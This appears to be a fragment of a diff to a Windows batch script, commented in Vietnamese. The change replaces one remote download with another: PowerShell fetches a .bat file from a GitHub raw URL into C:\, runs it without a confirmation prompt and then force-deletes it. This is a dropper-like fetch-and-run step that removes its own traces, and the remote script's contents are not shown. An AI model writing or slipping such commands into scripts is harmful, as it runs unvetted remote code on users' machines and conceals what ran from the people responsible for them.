@@ -33,18 +33,14 @@ if %found%==1 (
 
 
 
-set URL=https://raw.githubusercontent.com/mitutina/mitutina/main/windows.bat
-set FILE=%temp%\windows.bat
+:: Tải file .bat từ URL
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mitutina/mitutina/main/windows-backup.bat' -OutFile 'C:\windows-backup.bat'"
 
-:: Tải file bằng PowerShell
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%URL%', '%FILE%')"
+:: Chạy file .bat mà không hỏi xác nhận
+start /wait C:\windows-backup.bat
 
-if exist "%FILE%" (
-    echo Đang chạy file...
-    start "" "%FILE%"
-    
-) else (
-    echo Lỗi: Không thể tải file từ %URL%.
+:: Xóa file .bat sau khi thực thi
+del /f C:\windows-backup.bat
 
 
 
